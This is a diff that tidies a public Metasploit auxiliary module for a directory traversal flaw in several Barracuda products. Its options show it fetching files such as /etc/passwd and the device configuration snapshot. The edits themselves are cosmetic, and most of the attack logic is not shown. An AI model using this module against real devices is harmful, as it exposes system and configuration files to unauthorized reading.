@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -16,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'           => 'Barracuda Multiple Product "locale" Directory Traversal',
       'Description'    => %q{
           This module exploits a directory traversal vulnerability present in
-        serveral Barracuda products, including the Barracuda Spam and Virus Firewall,
+        several Barracuda products, including the Barracuda Spam and Virus Firewall,
         Barracuda SSL VPN, and the Barracuda Web Application Firewall. By default,
         this module will attempt to download the Barracuda configuration file.
       },
@@ -39,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8000),
         OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", '/mail/snapshot/config.snapshot']),
         OptString.new('TARGETURI', [true, 'Barracuda vulnerable URI path', '/cgi-mod/view_help.cgi']),
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -88,5 +85,4 @@ class MetasploitModule < Msf::Auxiliary
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
   rescue ::Timeout::Error, ::Errno::EPIPE
   end
-
 end
